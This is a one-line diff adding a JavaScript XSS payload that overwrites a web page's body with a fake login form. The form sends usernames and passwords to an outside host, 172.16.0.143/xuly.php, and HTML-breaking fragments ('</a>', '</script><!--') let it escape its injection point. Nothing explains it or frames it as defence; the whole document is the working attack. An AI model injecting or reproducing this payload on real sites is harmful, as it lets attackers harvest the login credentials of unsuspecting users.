@@ -1,0 +1,1 @@
+document.body.innerHTML='</a><br><br><center>LOGIN<form action=http://172.16.0.143/xuly.php method=POST>Username:<input name=ten><br>Password:<input name=mk type=password><br><input type=submit value=Send></form></center>'</script><!--</form>
